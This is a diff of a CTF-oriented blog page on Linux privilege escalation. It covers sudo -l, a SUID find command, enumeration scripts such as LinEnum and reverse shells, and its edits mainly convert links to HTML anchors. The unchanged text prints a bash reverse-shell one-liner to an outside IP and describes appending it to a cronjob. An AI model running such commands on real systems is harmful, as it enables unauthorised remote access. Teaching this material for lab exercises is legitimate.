@@ -17,17 +17,17 @@ To better qualify the situation - privilege escalation implies you already have 
 # Let's start with sudo -l and SUID permissions
 One of the go to commands once you've established yourself within a shell on a system is a quick `sudo -l`. It takes two seconds to type and another thirty seconds to check if anything from those results might be useful. What that does is list the commands that you can run as sudo, on a properly configured system this should be all but zero for normal users.
 <br><br>
-Let's say there is an improperly configured system that allows you to run `/usr/bin/less` with sudo rights. This could lead to you reading files that you should not have access to. The easiest way to discover if there is a way to exploit whatever is listed from the `sudo -l` command is to reference [gtfobins](https://gtfobins.github.io/). They have a _massive_ library of ways to bypass restrictions and escalate your privileges - their site will be referenced multiple times throughout my [CTF Exploits](/blog) page.
+Let's say there is an improperly configured system that allows you to run `/usr/bin/less` with sudo rights. This could lead to you reading files that you should not have access to. The easiest way to discover if there is a way to exploit whatever is listed from the `sudo -l` command is to reference <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">gtfobins</a>. They have a _massive_ library of ways to bypass restrictions and escalate your privileges - their site will be referenced multiple times throughout my [CTF Exploits](/blog) page.
 <br><br>
 On a very similar note, we can use files that have the SUID permissions (can run files with the owner's privileges) to escalate our privileges. We can check what files like this exist by entering `find / -perm -u=s -type f 2>/dev/null`. This is very similar to any other find command, what this searches for are files that contain those SUID permissions. And again, if this returns you a list reference gtfobins for any known exploits from them.
 <br><br>
-Manually checking each result from the SUID permissions can be tedious, however, and others have created scripts that can automate this process for us. I found [this page](https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/), which has a script that does exactly this and will inform you of anything that might be vulnerable. This is similar to the LinEnum script I will mention down below. You can try directly curling the script onto the target machine or just download it and start a web server locally and transfer it that way.
+Manually checking each result from the SUID permissions can be tedious, however, and others have created scripts that can automate this process for us. I found <a href="https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/" target="_blank" rel="noopener noreferrer">this page</a>, which has a script that does exactly this and will inform you of anything that might be vulnerable. This is similar to the LinEnum script I will mention down below. You can try directly curling the script onto the target machine or just download it and start a web server locally and transfer it that way.
 <br><br><br>
 
 # Uploading reverse tcp shells
 There are numerous ways you can start a reverse shell, I've modified plugins for a blog, replaced a file that was used by a cronjob, there's a range of ways.
 <br><br>
-A great site for this is [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), as they offer some quick commands that, once edited for your IP address and port, can start those shells via bash, perl, python, php and other methods. They also have more material on that side beyond just how to start reverse shells, including stuff relating to SQL injection and more notes on John.
+A great site for this is <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener noreferrer">pentestmonkey</a>, as they offer some quick commands that, once edited for your IP address and port, can start those shells via bash, perl, python, php and other methods. They also have more material on that side beyond just how to start reverse shells, including stuff relating to SQL injection and more notes on John.
 <br><br>
 Back to the reverse shell side of things, let's use the example I mentioned with modifying the file used by the cronjob. Essentially I was able to edit in the following command to a cronjob that executed every minute, and what I appended to that file was the following:<br>
 `bash -i >& /dev/tcp/10.18.91.219/8000 0>&1`<br><br>
@@ -60,7 +60,7 @@ Also known as cronjobs, although there are different kinds. Sometimes these will
 <br><br><br>
 
 # LinEnum
-This is another tool that can be found on GitHub, and can provide useful information on a target machine if you can get the permissions needed to run it. It does a lot of the things that are mentioned on this page automatically and generates a report for you to view later. Once you are on the machine you can get the file via wget or curl to the `/tmp` directory and work from there. The bash file is located [here](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh).<br><br>
+This is another tool that can be found on GitHub, and can provide useful information on a target machine if you can get the permissions needed to run it. It does a lot of the things that are mentioned on this page automatically and generates a report for you to view later. Once you are on the machine you can get the file via wget or curl to the `/tmp` directory and work from there. The bash file is located <a href="(https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener noreferrer">here</a>.<br><br>
 Note: You will likely need to `chmod +x` that file to give it executable permissions.
 <br><br><br>
 
